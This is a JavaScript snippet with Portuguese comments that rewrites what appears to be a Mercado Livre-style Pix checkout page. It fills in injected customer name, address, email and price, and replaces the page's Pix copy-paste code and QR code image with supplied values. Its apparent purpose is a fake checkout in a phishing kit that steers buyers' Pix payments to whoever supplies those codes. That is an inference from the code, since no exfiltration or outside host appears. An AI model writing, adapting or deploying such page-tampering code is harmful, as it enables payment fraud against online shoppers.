<script>
(function(){
  // Log para conferência
  console.log({
    email,
    firstName,
    lastName,
    postalCode,
    streetName,
    streetNumber,
    neighborhood,
    city,
    state,
    phone,
    price,
    copiaecola,
    qrCodeBase64
  });

  // Troca Informações de Contato (email)
  const emailElements = document.querySelectorAll('div.styles_paymentDetails__YOfE6 p.andes-typography');
  if (emailElements.length >= 1) {
    emailElements[0].textContent = email;
  }

  // Troca Nome
  const nomeElements = document.querySelectorAll('div.styles_paymentDetails__YOfE6 div:nth-child(3) p.andes-typography');
  if (nomeElements.length >= 1) {
    nomeElements[0].textContent = `${firstName} ${lastName}`;
  }

  // Troca Rua
  if (nomeElements.length >= 2) {
    nomeElements[1].textContent = `${streetName}, ${streetNumber}`;
  }

  // Troca Cidade + Estado
  if (nomeElements.length >= 3) {
    nomeElements[2].textContent = `${city}, ${state}`;
  }

  // Troca valor principal e Pix somente se price existir
  const valorNumber = price;

  const valorElements = document.querySelectorAll('div.styles_pixPaymentInformativeCardContainer__nC2T3 span.andes-typography');
  if (valorElements.length >= 1) {
    if (valorNumber !== null) {
      valorElements[0].textContent = `Falta pouco! Agora pague R$ ${valorNumber.toFixed(2)} via Pix para finalizar sua compra`;
    } else {
      valorElements[0].textContent = "";
    }
  }

  // Troca apenas o <strong> correto que contém o preço total
  const totalContainers = document.querySelectorAll('div.styles_paymentDetails__YOfE6 > div:last-child');
  if (totalContainers.length >= 1) {
    const strongs = totalContainers[0].querySelectorAll('strong.andes-typography');
    if (strongs.length >= 2) {
      if (valorNumber !== null) {
        strongs[1].textContent = `R$${valorNumber.toFixed(2)}`;
      } else {
        strongs[1].textContent = "";
      }
    }
  }

  // Gera chave Pix Copia e Cola e atualiza input e QR code apenas se houver valor
  const inputPix = document.getElementById('copy-paste-pix-code');
  const imgQR = document.querySelector('div.styles_pixPaymentDisplayQRContainer__3iNTK img');

  if (valorNumber !== null) {

    if (inputPix) {
      inputPix.value = copiaecola;
    }

    if (imgQR) {
      imgQR.src = qrCodeBase64;
    }
  } else {
    if (inputPix) {
      inputPix.value = "";
    }
    if (imgQR) {
      imgQR.src = "";
    }
  }

  

})();


</script>
